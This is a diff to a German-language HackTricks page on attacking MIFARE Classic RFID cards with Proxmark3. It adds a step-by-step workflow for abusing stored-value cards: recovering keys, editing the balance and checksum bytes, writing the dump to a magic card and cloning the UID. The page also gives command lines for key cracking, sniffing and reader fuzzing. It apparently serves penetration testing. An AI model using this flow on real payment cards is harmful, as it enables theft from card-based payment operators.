@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Angreifen von RFID-Systemen mit Proxmark3
+## Angriff auf RFID-Systeme mit Proxmark3
 
-Das erste, was Sie tun müssen, ist, einen [**Proxmark3**](https://proxmark.com) zu haben und [**die Software und ihre Abhängigkeiten zu installieren**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+Das Erste, was du brauchst, ist ein [**Proxmark3**](https://proxmark.com) und [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
 
-### Angreifen von MIFARE Classic 1KB
+### Attacking MIFARE Classic 1KB
 
-Es hat **16 Sektoren**, jeder von ihnen hat **4 Blöcke** und jeder Block enthält **16B**. Die UID befindet sich im Sektor 0 Block 0 (und kann nicht geändert werden).\
-Um auf jeden Sektor zuzugreifen, benötigen Sie **2 Schlüssel** (**A** und **B**), die in **Block 3 jedes Sektors** gespeichert sind (Sektortrailer). Der Sektortrailer speichert auch die **Zugriffsbits**, die die **Lese- und Schreib**berechtigungen für **jeden Block** mit den 2 Schlüsseln geben.\
-2 Schlüssel sind nützlich, um Berechtigungen zum Lesen zu geben, wenn Sie den ersten kennen, und zum Schreiben, wenn Sie den zweiten kennen (zum Beispiel).
+Es hat **16 sectors**, jeder davon hat **4 blocks** und jeder Block enthält **16B**. Die UID ist in sector 0 block 0 (und kann nicht verändert werden).\
+Um auf jeden Sektor zuzugreifen benötigst du **2 keys** (**A** und **B**), die in **block 3 of each sector** (sector trailer) gespeichert sind. Der sector trailer speichert auch die **access bits**, die die **read and write**-Berechtigungen auf **each block** mittels der 2 keys vergeben.\
+2 keys sind nützlich, um z.B. Leserechte zu geben, wenn man den ersten kennt, und Schreibrechte, wenn man den zweiten kennt (zum Beispiel).
 
-Es können mehrere Angriffe durchgeführt werden
+Mehrere attacks können durchgeführt werden
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +31,39 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-Der Proxmark3 ermöglicht es, andere Aktionen wie das **Abhören** einer **Tag-zu-Reader-Kommunikation** durchzuführen, um zu versuchen, sensible Daten zu finden. In dieser Karte könnten Sie einfach die Kommunikation sniffen und den verwendeten Schlüssel berechnen, da die **verwendeten kryptografischen Operationen schwach sind** und Sie mit dem Klartext und dem Chiffretext diesen berechnen können (`mfkey64` Tool).
+Der Proxmark3 ermöglicht weitere Aktionen wie **eavesdropping** einer **Tag to Reader communication**, um nach sensiblen Daten zu suchen. Bei dieser Karte könntest du einfach die Kommunikation sniffen und den verwendeten Schlüssel berechnen, weil die **verwendeten kryptographischen Operationen schwach sind** und wenn man Klar- und Chiffretext kennt, kann man ihn berechnen (`mfkey64` Tool).
+
+#### MiFare Classic schneller Ablauf für stored-value abuse
+
+Wenn Terminals Guthaben auf Classic-Karten speichern, ist ein typischer End-to-End-Ablauf:
+```bash
+# 1) Recover sector keys and dump full card
+proxmark3> hf mf autopwn
+
+# 2) Modify dump offline (adjust balance + integrity bytes)
+#    Use diffing of before/after top-up dumps to locate fields
+
+# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
+proxmark3> hf mf cload -f modified.bin
+
+# 4) Clone original UID so readers recognize the card
+proxmark3> hf mf csetuid -u <original_uid>
+```
+Hinweise
+
+- `hf mf autopwn` orchestriert nested/darkside/HardNested-style attacks, stellt keys wieder her und erstellt dumps im client dumps folder.
+- Das Schreiben von block 0/UID funktioniert nur auf magic gen1a/gen2 Karten. Normale Classic-Karten haben eine read-only UID.
+- Viele Deployments verwenden Classic "value blocks" oder einfache Checksummen. Stelle sicher, dass alle duplizierten/komplementierten Felder und Checksummen nach der Bearbeitung konsistent sind.
+
+Siehe eine Methodik auf höherer Ebene und Gegenmaßnahmen in:
+
+{{#ref}}
+pentesting-rfid.md
+{{#endref}}
 
 ### Rohbefehle
 
-IoT-Systeme verwenden manchmal **nicht markierte oder nicht kommerzielle Tags**. In diesem Fall können Sie Proxmark3 verwenden, um benutzerdefinierte **Rohbefehle an die Tags** zu senden.
+IoT-Systeme verwenden manchmal **nonbranded or noncommercial tags**. In diesem Fall kannst du Proxmark3 verwenden, um benutzerdefinierte **raw commands to the tags** zu senden.
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -45,14 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-Mit diesen Informationen könnten Sie versuchen, Informationen über die Karte und die Art der Kommunikation mit ihr zu suchen. Proxmark3 ermöglicht das Senden von Rohbefehlen wie: `hf 14a raw -p -b 7 26`
+Mit diesen Informationen kannst du versuchen, Informationen über die Karte und darüber zu recherchieren, wie man mit ihr kommuniziert. Proxmark3 erlaubt das Senden von Rohbefehlen wie: `hf 14a raw -p -b 7 26`
 
 ### Skripte
 
-Die Proxmark3-Software wird mit einer vorinstallierten Liste von **Automatisierungsskripten** geliefert, die Sie verwenden können, um einfache Aufgaben auszuführen. Um die vollständige Liste abzurufen, verwenden Sie den Befehl `script list`. Verwenden Sie anschließend den Befehl `script run`, gefolgt vom Namen des Skripts:
+Die Proxmark3-Software wird mit einer vorinstallierten Liste von **Automationsskripten** geliefert, die du verwenden kannst, um einfache Aufgaben auszuführen. Um die vollständige Liste abzurufen, verwende den Befehl `script list`. Danach nutze den Befehl `script run`, gefolgt vom Namen des Skripts:
 ```
 proxmark3> script run mfkeys
 ```
-Sie können ein Skript erstellen, um **Tag-Leser** zu **fuzzern**, indem Sie die Daten einer **gültigen Karte** kopieren. Schreiben Sie einfach ein **Lua-Skript**, das ein oder mehrere zufällige **Bytes** **randomisiert** und überprüft, ob der **Leser bei einer Iteration abstürzt**. 
+Du kannst ein Skript erstellen, um **fuzz tag readers** zu testen: Kopiere die Daten einer **valid card** und schreibe ein **Lua script**, das ein oder mehrere zufällige **bytes** randomize und überprüft, ob der **reader crashes** bei irgendeiner Iteration.
+
+## Referenzen
+
+- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
